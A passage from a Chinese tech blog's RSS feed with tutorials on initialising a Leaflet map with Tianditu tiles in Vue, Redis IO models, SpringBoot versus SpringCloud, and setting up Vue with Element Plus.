Configurations中配置Environment variables：--jasypt.encryptor.password=密钥若未找到的话可以通过以下步骤打开：http://www.ppmy.cn/news/1540361.html相关文章leaflet(一)初始化地图Leaflet 与天地图结合使用&amp;#xff0c;可以通过天地图提供的 API 获取地图瓦片&amp;#xff0c;并在 Leaflet 地图上显示。 
1. 安装依赖 
首先&amp;#xff0c;确保你已经安装了 Leaflet 和 Vue&amp;#xff1a; 
npm install leaflet
npm install vue-leaflet
npm install leaflet.tilela…阅读更多...【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:03 +0000</pubDate>
    </item>
    <item>
      <title>leaflet(一)初始化地图</title>
      <link>https://www.ppmy.cn/news/1540360.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维leaflet(一)初始化地图news/2025/10/31 17:53:02/Leaflet 与天地图结合使用，可以通过天地图提供的 API 获取地图瓦片，并在 Leaflet 地图上显示。1. 安装依赖首先，确保你已经安装了 Leaflet 和 Vue：npm install leaflet
npm install vue-leaflet
npm install leaflet.tilelayer.colorfilter   //添加带有颜色过滤器的瓦片层2. 引入 Leaflet 和样式在你的 Vue 组件中引入 Leaflet 和其样式文件：&lt;template&gt;&lt;divid="mapDiv"class="map"style="width: 100%; height: 100%; background-color: rgba(15, 44, 80, 0.9) !important;"&gt;&lt;/div&gt;
&lt;/template&gt;&lt;script&gt;
import L from "leaflet";
import "leaflet.tilelayer.colorfilter";
import "leaflet/dist/leaflet.css";
let atopMap = null;
export default {mounted() {this.initMap();this.addTianDiTuLayer();},methods: {//初始化地图initMap() {atopMap = L.map("mapDiv", {//参考坐标系crs: L.CRS.EPSG3857,// 中心点(这里是北京)center: [39.89945, 116.40769],//最小显示等级minZoom: 0,//最大显示等级maxZoom: 18,//当前显示等级zoom: 13,zoomControl: false,contextmenu: true,//不添加属性说明控件attributionControl: false,});//定义一个比例尺控件const scaleControl = L.control.scale();//将比例尺控件加载到地图容器中atopMap.addControl(scaleControl);},//增加天地图底图图层addTianDiTuLayer() {// 矢量图+注记// let mapTypes = ['vec_c', 'cva_c'];let mapTypes = ["vec_w", "cva_w"];let layers = [];for (let i = 0, len = mapTypes.length; i &lt; len; i++) {let tdtUrl = `http://t0.tianditu.gov.cn/DataServer?T=${mapTypes[i]}&amp;x={x}&amp;y={y}&amp;l={z}&amp;tk=${YOUR_API_KEY}`;let layer = L.tileLayer.colorFilter(tdtUrl, {filter: ["grayscale:100%","invert:100%","brightness:60%","hue:220deg","saturate:54%","opacity: 50%",],zoomOffset: 0, // 注意如果是 web 墨卡托投影(EPSG:3857) 请改为 0noWrap: true,bounds: [[-90, -180],[90, 180],],});layers.push(layer);}// LayerGroup 对象L.layerGroup(layers).addTo(atopMap);},}
}
&lt;/script&gt;&lt;style lang="scss" scoped&gt;
.tdt-tile-pane {.tdt-layer:first-child + .tdt-layer {.tdt-tile-loaded {-webkit-filter: grayscale(100%) invert(100%);opacity: 0.5 !important;}}
}::v-deep .icon-label {color: #fff;width: 70px;text-align: center;font-size: 14px !important;
}::v-deep .tdt-control-container {display: none !important;
}.map {background-color: rgba(15, 44, 80, 0.9) !important;
}
&lt;/style&gt;http://www.ppmy.cn/news/1540360.html相关文章【黑马Redis原理篇】Redis网络模型来源视频 [16,27]  文章目录 1.用户空间和内核空间空间划分缓冲区 2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式&amp;#xff0c;有多种实现 2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步 1.用户空间和内…阅读更多...开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:02 +0000</pubDate>
    </item>
    <item>
      <title>【黑马Redis原理篇】Redis网络模型</title>
      <link>https://www.ppmy.cn/news/1540359.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【黑马Redis原理篇】Redis网络模型news/2025/10/31 17:53:00/来源视频 [16,27]文章目录1.用户空间和内核空间空间划分缓冲区2.IO模型2.1 阻塞IO2.2 非阻塞IO2.3 IO多路复用2.3.1 阻塞和非阻塞的对比2.3.2 IO多路复用2.3.3 监听FD方式、通知的方式，有多种实现2.4 信号驱动IO2.5 异步IO2.6 真正的同步和异步1.用户空间和内核空间空间划分为了避免内存崩溃，需要分为用户空间和内核空间。进程的寻址空间会划分为这两部分，比如低位划分为内核空间，高位划分为用户空间。在权限上也划分不同等级。缓冲区在用户空间和内核空间都加入缓冲区，提高IO效率。写数据时，把用户缓冲数据 拷贝到 -&gt; 内核缓冲区-&gt; 然后写入设备。读数据时，要从设备读取数据 -&gt; 内核缓冲区-&gt;拷贝到用户缓冲区，用户再读取。2.IO模型用户缓冲区调用内核指令，访问内核缓冲区，读取硬件设备的数据。2.1 阻塞IO阻塞IO，用户进程在两个阶段都在等待：用户进程向操作系统发起一个IO请求（系统调用）时，用户进程被阻塞，等待还没被准备好的数据；操作系统内核的IO子系统会监控硬件设备的状态，等待数据准备就绪。如果数据已经准备好了，中断处理程序会通知操作系统内核的IO子系统。然后，操作系统内核会将数据从硬件设备拷贝到内核空间的缓冲区，再将数据从内核空间拷贝到用户空间的缓冲区。数据拷贝完成后，操作系统内核会通知之前被阻塞的应用程序线程。2.2 非阻塞IO非阻塞IO，用户调用时，会立即返回结果，而不阻塞用户进程。用户进程可以反复调用反复询问，直到结果是有数据了，就将数据从内核缓冲区拷贝到用户缓冲区。在非阻塞IO中，用户进程在调用阶段是非阻塞的，在拷贝数据阶段还是阻塞的。而且忙等机制让CPU使用率暴增。因此，可能性能还不如阻塞IO。2.3 IO多路复用2.3.1 阻塞和非阻塞的对比阻塞和非阻塞IO的区别主要在于没有数据时，一个阻塞一个不阻塞；有数据时是一样的操作，直接进入第二阶段，读取并处理数据。2.3.2 IO多路复用每个文件都有一个对应的文件描述符FD（每个socket都是一个FD）。IO多路复用：利用单个线程（复用的是线程）同时监听多个FD，并在某个FD可读、可写时得到通知，从而避免无效的等待，充分利用CPU资源。用户进程监听多个FD，调用select。内核检查监听的多个FD，只要有任意数据就绪，就会返回结果给用户进程。（如果所有数据全都没有就绪，应用进程就阻塞等待）内核将数据存储在内核缓冲区，用户进程循环调用recvfrom，把每个数据从内核缓冲区拷贝到用户缓冲区，用户进程处理用户空间缓冲区的数据。（数据拷贝时同样是阻塞的）recvfrom直接尝试读取某个FD。用户进程通常在一个循环中重复上述过程，以持续监听和处理多个文件描述符上的IO事件。2.3.3 监听FD方式、通知的方式，有多种实现常见的有：select, poll, epoll区别：select和poll只会告诉用户进程有FD就绪，但不知道是哪一个FD。用户进程需要遍历每一个FD确认是否就绪；epoll通知用户进程有FD就绪，同时把这个已就绪的FD写入用户空间。（可以不看）不同方式的具体实现…2.4 信号驱动IO信号驱动IO，用户程序与内核建立信号关联后就返回（非阻塞）。当数据就绪后，内核发送信号通知用户程序。用户程序就可以调用获得数据。（数据从内核拷贝到用户空间仍是阻塞的）2.5 异步IO用户发起系统调用后就返回。后续工作由内核全部完成，完成后递交信号通知用户。2.6 真正的同步和异步阻塞IO、非阻塞IO、多路复用IO、信号驱动IO在拷贝数据时都是阻塞的，实际上都属于同步的IO操作。只有“异步IO”是真正的异步操作。这种阻塞发生的原因是因为用户进程需要等待内核空间的拷贝操作完成，才能继续执行后续的操作。用户进程在数据拷贝期间被阻塞的原因是：内核空间操作：数据拷贝是在内核空间进行的，用户进程无法干预或控制这个过程，因此必须等待内核完成拷贝；资源管理：内核需要确保数据拷贝过程中的内存管理是安全的，不会导致数据损坏或内存泄漏。因此，用户进程在这个阶段被阻塞，直到内核确认数据拷贝完成；上下文切换：如果用户进程在数据拷贝期间不被阻塞，它可能会尝试访问或修改正在被内核拷贝的数据，这可能会导致数据不一致或其他问题。阻塞用户进程可以避免这种风险。http://www.ppmy.cn/news/1540359.html相关文章开篇：SpringBoot与SpringCloud的那些事在正式开始研究 SpringCloud 的技术之前&amp;#xff0c;咱先简单的用比较短的篇幅聊一点概述性质的东西&amp;#xff0c;让思维活跃起来。 SpringCloud与SpringBoot的关系和对比 一开始学习 SpringCloud 咱就知道&amp;#xff0c;SpringCloud 的技术大多都不是自己造的&amp;#xff0c;都是整合…阅读更多...Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:01 +0000</pubDate>
    </item>
    <item>
      <title>开篇：SpringBoot与SpringCloud的那些事</title>
      <link>https://www.ppmy.cn/news/1540358.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维开篇：SpringBoot与SpringCloud的那些事news/2025/10/31 17:53:00/在正式开始研究 SpringCloud 的技术之前，咱先简单的用比较短的篇幅聊一点概述性质的东西，让思维活跃起来。SpringCloud与SpringBoot的关系和对比一开始学习 SpringCloud 咱就知道，SpringCloud 的技术大多都不是自己造的，都是整合了现有的技术而来，而整合的方式和风格是采用 SpringBoot 的基础架构。所以由此可以总结出 SpringBoot 与 SpringCloud 的一个很大的、也是最重要的区别：SpringBoot 着眼于单体应用的快速构建开发SpringCloud 关注全局应用的构建和治理而且还有一点，SpringBoot 是单体应用开发，开发基于 SpringBoot 的应用时完全可以不依赖 SpringCloud 的组件；而只要使用了 SpringCloud ，就离不开 SpringBoot 了。SpringCloud是方案而不是实现咱也知道，SpringCloud 实质上是整合了好多的技术，总结出的一套完整的微服务构建的整体解决方案，它包含的内容非常多（服务发现、负载均衡、熔断降级、服务网关、消息总线、配置中心等）。由此可以看得出来，SpringCloud 更像是定制好了一套微服务解决方案的规范，具体实现可以不是自己搞，于是就出现了好多大厂自己整合的 SpringCloud 整合方案，目前被大家熟知的一般有两种：SpringCloudNetflix 、SpringCloudAlibaba 。前面几年，SpringCloud 一直都是主推 SpringCloudNetflix 的技术解决方案，但随着 Netflix 的产品出现这样那样的事情，搞得大家都怪别扭的，SpringCloud 官方也别扭。正巧 Alibaba 对 SpringCloud 的整体解决方案中也提供了一些解决方案（服务发现、配置中心、消息、事务等），SpringCloud 官方觉得很可以，就把 SpringCloudAlibaba 也抬到了 SpringCloud 的主页上了。先写SpringCloudNetflix的一些小想法既然现有的整体解决方案有 SpringCloudNetflix 与 SpringCloudAlibaba ，而我选择先写 Netflix 系的组件，这里面有几个我个人的想法吧。先写 SpringCloudNetflix 有几个原因：从目前我对身边一些小伙伴的调查，大多数都反馈，还是 SpringCloudNetflix 用的多，SpringCloudAlibaba 刚开始成型，大多数还不是很敢用，而且前段时间面试的伙计跟我说，面试也都是问 SpringCloudNetflix 的东西，几乎不问 SpringCloudAlibaba ，这也更坚定了我的想法，还是先把 SpringCloudNetflix 的原理写出来吧。另外一个原因，就要回归到 SpringCloudNetflix 与 SpringCloudAlibaba 的本身了，SpringCloudAlibaba 更多的是给你一些已经封装好的组件，你拿去用就可以（开箱即用），不像 SpringCloudNetflix 一样还得自己引入依赖、自己配置这个那个的，所以从这个角度来讲，SpringCloudAlibaba 的封装度更高，反而不适合刚接触 SpringCloud 原理的小伙伴快速理解内部的设计和构造。也是基于这个原因吧，我选择先搞 SpringCloudNetflix 的原理。小册的核心内容再说下小册的核心内容吧，这次写 SpringCloudNetflix 的内容主要围绕五大神兽来：服务注册与服务发现：Eureka服务调用与负载均衡：Ribbon &amp; Feign服务熔断与服务降级：Hystrix服务网关与动态路由：Zuul &amp; Gateway分布式配置中心：Config毕竟这些个家伙是咱平常微服务开发中最常用到的，那重点自然就放到这上面了。除此之外的一些同属于 SpringCloud 官方的其他组件，目前暂时还没有考虑到写进来，如果小伙伴的呼声比较高，我也可以在发行后继续往里面填充（没关系，发行了也可以继续往里加）。最后也不多bb了，愿小伙伴能在 Cloud 小册的加持下，对 SpringCloud 的原理和设计有一定的理解，最理想的效果那自然是升华自己，如果能再在简历中添上非常重的一笔，那简直就是完美（滑稽）！快上车，咱准备上高速了 ~ ~ ~ 突突突突突突——————© 著作权归作者所有,转载或内容合作请联系作者喜欢的朋友记得点赞、收藏、关注哦！！！http://www.ppmy.cn/news/1540358.html相关文章Vue快速创建工程+Element Plus创建Vue工程  执行命令 
npm init vuelatest 执行这两个绿色的命令 执行这个命令启动 
npm run dev Element 
打开网站https://element-plus.org/zh-CN/ npm install element-plus --save 然后在vscode中打开你的项目工程 // main.ts
import { createApp } from vue
import Ele…阅读更多...jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
在卸载之前…阅读更多...【MySQL】InnoDB存储引擎中的锁实现事务隔离级别的过程中用到了锁&amp;#xff0c;所谓锁就是在事务A修改某些数据时&amp;#xff0c;对这些数据加一把锁&amp;#xff0c;防止其他事务同时对这些数据执行修改操作;当事务A完成修改操作后&amp;#xff0c;释放当前持有的锁&amp;#xff0c;以便其他事务再次上锁执行对应的操作。不同…阅读更多...10月18日，每日信息差第一、现代汽车集团在上海举办了中国前瞻技术研发中心的发布及启新庆典&amp;#xff0c;宣布成立其全资法人公司 —— 现代前瞻汽车技术开发&amp;#xff08;上海&amp;#xff09;有限公司。该中心是集团在海外建立的首个前瞻技术研发中心&amp;#xff0c;专注于自动驾驶、智能座舱、共享出行等…阅读更多...23种设计模式具体实现方法提示&amp;#xff1a;文章 文章目录 前言一、背景二、设计模式1、代理模式2、适配器模式2.1 总结 三、3.1 总结 前言 
前期疑问&amp;#xff1a; 本文目标&amp;#xff1a; 一、背景 
最近 
二、设计模式 
1、代理模式 
参考的这篇文章&amp;#xff0c;代理模式(Proxy) 
同时这篇文章还引用了另…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:00 +0000</pubDate>
    </item>
    <item>
      <title>Vue快速创建工程+Element Plus</title>
      <link>https://www.ppmy.cn/news/1540357.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Vue快速创建工程+Element Plusnews/2025/10/31 17:52:59/创建Vue工程执行命令npm init vue@latest执行这两个绿色的命令执行这个命令启动npm run devElement打开网站https://element-plus.org/zh-CN/npm install element-plus --save然后在vscode中打开你的项目工程// main.ts
import { createApp } from 'vue'
import ElementPlus from 'element-plus'
import 'element-plus/dist/index.css'
import App from './App.vue'const app = createApp(App)app.use(ElementPlus)
app.mount('#app')把快速开始的代码，放到main.js中然后就可以开始你的项目啦！！！http://www.ppmy.cn/news/1540357.html相关文章jQuery 中的 Ajax 详解一、概念 众所周知&amp;#xff0c;jQuery 是一个跨主流浏览器的 JavaScript 库&amp;#xff0c;它封装了 JavaScript 的常用功能代码&amp;#xff0c;简化了 HTML DOM 操作、事件处理、动画设计和 Ajax 交互等任务。jQuery 中的 Ajax 是对 XMLHttpRequest 或 ActiveXObject&amp;#xff08;IE9…阅读更多...Java 小游戏《超级马里奥》文章目录 一、效果展示二、代码编写1. 素材准备2. 创建窗口类3. 创建常量类4. 创建动作类5. 创建关卡类6. 创建障碍物类7. 创建马里奥类8. 编写程序入口 一、效果展示 二、代码编写 
1. 素材准备 
首先创建一个基本的 java 项目&amp;#xff0c;并将本游戏需要用到的图片素材 image…阅读更多...智能体网络时代即将来临，我们需要新的连接技术备注&amp;#xff1a;如果你也对这个话题感兴趣&amp;#xff0c;欢迎联系我们&amp;#xff1a; email: chgaoweigmail.com  Discord: https://discord.gg/CDYdTPXXMB  官网: https://pi-unlimited.com  
我们的方案代码已经开源&amp;#xff0c;github&amp;#xff1a;https://github.com/chgaowei/…阅读更多...Ubuntu卸载Mysql【ubuntu 24.04/mysql 8.0.39】一、准备工作 
查看ubuntu版本号  查看mysql版本号(如果没有安装mysql,这一步省略)  
二、Ubuntu上卸载mysql(如果没有安装mysql这一步省略) 
在Ubuntu上卸载MySQL可以通过以下步骤进行&amp;#xff0c;确保完全移除MySQL相关的包和数据&amp;#xff1a; 
1. 停止MySQL服务 
